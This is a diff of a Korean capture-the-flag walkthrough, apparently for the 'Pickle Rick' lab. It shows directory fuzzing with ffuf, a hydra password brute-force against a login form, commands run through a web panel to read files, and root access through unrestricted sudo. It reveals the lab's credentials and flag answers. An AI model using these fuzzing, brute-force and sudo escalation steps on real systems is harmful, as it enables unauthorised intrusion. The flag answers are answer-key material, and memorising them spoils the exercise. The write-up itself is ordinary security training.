@@ -203,7 +203,7 @@ ffuf -u http://10.65.165.154/FUZZ.php -w /usr/share/wordlists/dirb/common.txt
 └─$ 
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~]
-└─$ ffufffuf -u http://10.65.165.154/FUZZ.php -w /usr/share/wordlists/dirb/common.txt                                                                  
+└─$ ffuf -u http://10.65.165.154/FUZZ.php -w /usr/share/wordlists/dirb/common.txt                                                                  
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -235,3 +235,112 @@ portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 207
 :: Progress: [4614/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
 
 # login.php
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/26abefbf-e17f-40d7-82f4-9b09b3ea3a75/image.png)
+
+
+──(kali㉿kali)-[~]
+└─$ http http://10.65.165.154/login.php
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 455
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 20 Nov 2025 13:27:13 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=5, max=100
+Pragma: no-cache
+Server: Apache/2.4.41 (Ubuntu)
+Set-Cookie: PHPSESSID=a2hmionl2mnu6ju4fa7burc4i1; path=/
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Rick is sup4r cool</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="assets/bootstrap.min.css">
+  <script src="assets/jquery.min.js"></script>
+  <script src="assets/bootstrap.min.js"></script>
+</head>
+<body>
+
+  <div class="container">
+  </br><img width="300" src="assets/portal.jpg"><h3>Portal Login Page</h3></br>
+    <form name="input" action="" method="post">
+      <label for="username">Username:</label><input type="text" class="form-control" value="" id="username" name="username" />
+      <label for="password">Password:</label><input type="password" class="form-control" value="" id="password" name="password" />
+
+      
+    </br><input type="submit" value="Login" class="btn btn-success" name="sub"/>
+    </form>
+  </div>
+
+</body>
+</html>
+
+
+sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed" -t 4
+
+
+R1ckRul3s
+Wubbalubbadubdub
+
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/18b9b5f7-7d87-4031-8eda-542d66de0024/image.png)
+
+명령어가 쓰이네? cat 안 됨
+
+경로로는?
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/6a566deb-6a52-487a-bcfa-2226194f68a6/image.png)
+
+
+실패
+cp /home/rick/second\ ingredients ./second.txt
+
+
+성공
+ls -al /home/rick/second\ ingredients
+-rwxrwxrwx 1 root root 13 Feb 10  2019 /home/rick/second ingredients
+
+실패
+cat /home/rick/second\ ingredients
+
+성공
+strings /home/rick/second\ ingredients
+less /home/rick/second\ ingredients
+1 jerry tear
+
+
+# sudo check
+
+sudo -l
+
+Matching Defaults entries for www-data on ip-10-65-165-154:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-65-165-154:
+    (ALL) NOPASSWD: ALL
+
+
+
+
+sudo ls -al /root/
+
+total 36
+drwx------  4 root root 4096 Jul 11  2024 .
+drwxr-xr-x 23 root root 4096 Nov 20 13:11 ..
+-rw-------  1 root root  168 Jul 11  2024 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+drwx------  2 root root 4096 Feb 10  2019 .ssh
+-rw-------  1 root root  702 Jul 11  2024 .viminfo
+-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x  4 root root 4096 Jul 11  2024 snap
+
+
+sudo strings /root/3rd.txt
+fleeb juice
